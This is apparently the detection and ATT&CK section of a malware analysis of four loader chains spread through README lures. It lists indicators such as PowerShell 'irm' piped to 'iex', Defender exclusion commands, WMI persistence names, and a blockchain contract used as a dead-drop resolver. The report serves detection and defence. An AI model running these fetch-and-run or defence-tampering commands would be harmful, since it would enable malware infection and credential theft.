A and B share a beacon protocol and look like one family. C is a separate toolkit, shared with the Hytale sample. D is the most elaborate and uses a different infrastructure again.

### Sandbox tags and heuristics reviewed

Chain B's Triage score of 3/10 ("Likely benign"), with the single "Untrusted Codesign Signers" signature, is misleading: the executable's beacon matches chain A's Remus registration (see chain B). The decoy `at.exe` in chain A is probably there to make the process tree look unremarkable, but that is inferred. The apparent 405 "refusals" from the chain A server carry data (see chain A), so they are not evidence of a dead server.

## Detection

- **Pipe to shell from a README.** Alert on PowerShell with `irm`/`Invoke-RestMethod` piped to `iex` that reaches a domain the host has never contacted.
- **Defender tampering.** Look for `Add-MpPreference -ExclusionPath` and `-ExclusionExtension '.exe'` from hidden PowerShell, and for exclusions that cover a Temp subfolder.
- **WMI persistence.** Watch for event filters named `WinSysUpdate` and consumers named `SysUpdateConsumer` in `root\subscription`, and for `RuntimeBroker.exe`, `HealthService.exe` or `SearchIndexer.exe` running from `AppData`.
- **Process tree for chain A.** `Helper.exe` → `at.exe /8576uhsdfjkgh2034958` → `AutoIt3.exe Rentcom.a3x` from a `%TEMP%\IXP000.TMP` folder.
- **Network.** A plain-HTTP POST to a non-standard port with `Host: github.com` and a destination that is not GitHub. A `getData()` `eth_call` to the contract above from a non-wallet process. A large HTTP POST to a raw IP with a `multipart/form-data` field named `file` and a Chrome user agent from a non-browser process.
- **Hunting for the contract.** Any process that issues `eth_call` against `0x1823A9a0Ec8e0C25dD957D0841e3D41a4474bAdc` is a Chain C or Hytale-style loader.

## MITRE ATT&CK

| Tactic | Technique | Evidence |
|---|---|---|
| Initial Access / Execution | T1204.002 User Execution: Malicious File | README lures: paste a command or unpack a zip |
| Execution | T1059.001 PowerShell / T1059.003 Windows Command Shell | `irm … | iex` and the script hops; `cmd /C Launcher.bat` |
| Command and Control | T1105 Ingress Tool Transfer | `1.zip`, `7za.exe`, `clip.exe`, `kehrio.exe` |
| Defense Evasion | T1562.001 Impair Defenses: Disable or Modify Tools | Defender exclusions (chain A when elevated, chain D) |
| Defense Evasion | T1036.005 Match Legitimate Name or Location | `RuntimeBroker.exe`, `HealthService.exe`, `apphelp.exe` |
| Defense Evasion | T1055 Process Injection | Self-injection into `AutoIt3.exe`; Chrome injection in chain D is inferred |
| Persistence | T1546.003 WMI Event Subscription | `WinSysUpdate` filter, `SysUpdateConsumer` (chain D) |
| Persistence | T1547.001 Registry Run Keys | `RuntimeBroker` and `SecurityHealth` values (chain D) |
| Credential Access / Collection | T1555.003 Credentials from Web Browsers / T1005 Data from Local System | Browser profile, email client and wallet file reads (chain A signatures) |
| Collection | T1113 Screen Capture | Desktop screenshots in chains A, C and D |
| Command and Control | T1102.001 Dead Drop Resolver | C2 address read from the Polygon contract (chain C) |
| Exfiltration | T1041 Exfiltration Over C2 Channel | Uploads in chains A, C and D |

The Defender exclusions, WMI subscription and Chrome thread-context call are absent from Triage's own matrix.

## Confidence and limits

**Observed.** The full A chain through its scripts and the C2 protocol on the wire; the identical `tag`/`exp`/`hwid` beacon in chain B; the Lua chain and the decoded contract call; the Electron persistence commands, the payload downloads, the `/photo` relay uploads, and the equality of `clip.exe` with the persistence copies.

**Inferred.** That `Setup.exe` belongs to the same family as `Helper.exe`; that `clip.exe` hijacks the clipboard; that `guckridge[.]com` and Telegram are exfiltration channels; Chrome injection by chain D; the purpose of the `at.exe` decoy; and the cause of the first-host stall in chain C.

**Not established.** The code of `Rentcom.a3x`, the Electron app's JavaScript, the encrypted bodies in the 405 replies, the TLS content to `guckridge[.]com`, and anything `Setup.exe` does after its first beacon. The count of 26 repositories comes from the first analysis and was not independently re-counted.

*Sources: Triage submissions 260906-qe7z4stsfx, 260926-mb1j3s1dpe, 260926-l93awszy9k and 260926-mdxwzazz8l with their packet captures; the recovered `update.ps1` and loader scripts; the payload files; and local REMnux captures.*
